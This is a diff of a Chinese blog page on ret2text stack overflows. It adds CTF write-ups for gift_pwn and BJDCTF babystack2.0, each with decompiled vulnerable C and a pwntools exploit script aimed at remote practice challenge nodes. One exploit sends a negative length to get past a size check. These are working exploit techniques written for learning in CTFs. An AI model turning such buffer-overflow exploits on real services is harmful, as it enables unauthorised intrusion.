@@ -69,7 +69,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text-%EF%BC%88from-NISA%E5%86%85%E9%83%A8%E6%96%B0%E7%94%9F%E8%B5%9B%EF%BC%89"><span class="toc-text">ret2text （from NISA内部新生赛）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-pwn"><span class="toc-text">[SWPUCTF 2021 新生赛]gift_pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="toc-text">整数溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-babystack2-0"><span class="toc-text">[BJDCTF 2020]babystack2.0</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -228,7 +228,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">405字</span>
+        <span class="post-count">841字</span>
       </span>
     </span>
 
@@ -237,7 +237,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">3分</span>
       </span>
     </span>
     
@@ -259,7 +259,7 @@
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
 <p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
 <hr>
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>拿到附件</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="ret2text-（from-NISA内部新生赛）"><a href="#ret2text-（from-NISA内部新生赛）" class="headerlink" title="ret2text （from NISA内部新生赛）"></a>ret2text （from NISA内部新生赛）</h2><p>拿到附件</p>
 <p>丢进虚拟机<code>chmod +x</code>给权限，然后checksec</p>
 <p><img src="/blog/2023/08/02/ret2text/image-20230802163523146.png" alt="image-20230802163523146"></p>
 <p>64位开NX保护，丢进ida64</p>
@@ -296,6 +296,101 @@ p<span class="token punctuation">.</span>sendline<span class="token punctuation"
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/blog/2023/08/02/ret2text/image-20230802164657649.png" alt="image-20230802164657649"></p>
+<hr>
+<h2 id="SWPUCTF-2021-新生赛-gift-pwn"><a href="#SWPUCTF-2021-新生赛-gift-pwn" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn"></a>[SWPUCTF 2021 新生赛]gift_pwn</h2><p>常规操作</p>
+<p><img src="/blog/2023/08/02/ret2text/image-20230806223550491.png" alt="image-20230806223550491"></p>
+<p>是64位</p>
+<p>ida64 f5看main函数</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">vuln</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跟踪到vuln函数</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>
+
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>定义长度16，读取0x64&#x3D;100，存在溢出，64位下偏移量为0x10+0x8</p>
+<p>shift+f12查看字符串找到&#x2F;bin&#x2F;sh</p>
+<p><img src="/blog/2023/08/02/ret2text/image-20230806223828425.png" alt="image-20230806223828425"></p>
+<p>继续双击跟踪右边的gift</p>
+<p><img src="/blog/2023/08/02/ret2text/image-20230806223917889.png" alt="image-20230806223917889"></p>
+<p>跟踪上去后tab+space查看汇编代码</p>
+<p><img src="/blog/2023/08/02/ret2text/image-20230806224018470.png" alt="image-20230806224018470"></p>
+<p>得到进入方法的地址0x4005B6</p>
+<p>写exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token string">"28060"</span><span class="token punctuation">)</span>
+
+offset <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x8</span>
+binsh_addr <span class="token operator">=</span> <span class="token number">0x4005B6</span>
+payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/02/ret2text/image-20230806224245130.png" alt="image-20230806224245130"></p>
+<hr>
+<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><h2 id="BJDCTF-2020-babystack2-0"><a href="#BJDCTF-2020-babystack2-0" class="headerlink" title="[BJDCTF 2020]babystack2.0"></a>[BJDCTF 2020]babystack2.0</h2><p>考点知识待补充</p>
+<p>基操</p>
+<p><img src="/blog/2023/08/02/ret2text/image-20230806224915475.png" alt="image-20230806224915475"></p>
+<p>ida64 f5看main</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>
+  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>
+
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">LODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"**********************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*     Welcome to the BJDCTF!     *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"* And Welcome to the bin world!  *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*  Let's try to pwn the world!   *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"* Please told me u answer loudly!*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]Are u ready?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]Please input the length of your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">10</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oops,u name is too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+]What's u name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们一开始输入的会作为nbytes的值，然后nbytes会作为read函数读取的长度，而nbytes的值不能超过10</p>
+<p>可以注意到read函数这里的nbytes用了unsigned int，也就是说我们可以输入负数来绕过上面的限制</p>
+<p>buf定义12，64位下偏移量为0x10+0x8</p>
+<p>shift+f12找到&#x2F;bin&#x2F;sh</p>
+<p><img src="/blog/2023/08/02/ret2text/image-20230806225716470.png" alt="image-20230806225716470"></p>
+<p>一路跟踪到backdoor</p>
+<p><img src="/blog/2023/08/02/ret2text/image-20230806225757402.png" alt="image-20230806225757402"></p>
+<p>得到地址0x400726</p>
+<p>编写exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node2.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token string">"28162"</span><span class="token punctuation">)</span>
+<span class="token comment">#context.log_level = "debug"</span>
+offset <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x8</span>
+binsh_addr <span class="token operator">=</span> <span class="token number">0x400726</span>
+payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'-10000'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
 
     </div>
     
